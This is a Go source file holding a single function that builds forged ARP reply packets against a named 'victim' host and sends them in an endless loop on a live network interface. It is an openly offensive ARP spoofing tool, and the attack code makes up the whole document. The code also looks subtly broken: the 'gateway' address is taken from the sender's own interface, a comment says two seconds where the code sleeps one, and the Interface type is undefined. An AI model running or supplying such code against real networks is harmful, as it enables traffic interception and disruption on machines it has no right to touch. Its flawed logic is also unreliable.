package main

import (
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func SpoofInterface(myInterface *Interface, targetInterface *Interface) {
	// Network interface to use (e.g., eth0)
	// Victim and gateway IP and MAC addresses
	victimIP := net.ParseIP(targetInterface.IP.String())
	victimMAC, _ := net.ParseMAC(targetInterface.MAC.String())
	gatewayIP := net.ParseIP(myInterface.IP.String())
	gatewayMAC, _ := net.ParseMAC(myInterface.MAC.String())

	// Create ARP packet
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}

	ether := &layers.Ethernet{
		SrcMAC:       gatewayMAC,
		DstMAC:       targetInterface.MAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   gatewayMAC,
		SourceProtAddress: gatewayIP.To4(),
		DstHwAddress:      victimMAC,
		DstProtAddress:    victimIP.To4(),
	}

	gopacket.SerializeLayers(buffer, opts, ether, arp)
	packetData := buffer.Bytes()

	// Open the network interface
	handle, err := pcap.OpenLive(myInterface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Continuously send the ARP spoof packets
	for {

		log.Println("Sending ARP packets to", victimIP.String())

		if err := handle.WritePacketData(packetData); err != nil {
			log.Fatal(err)
		}

		log.Println("Sent ARP packets to", victimIP.String())

		// Sleep for 2 seconds
		time.Sleep(1 * time.Second)
	}
}
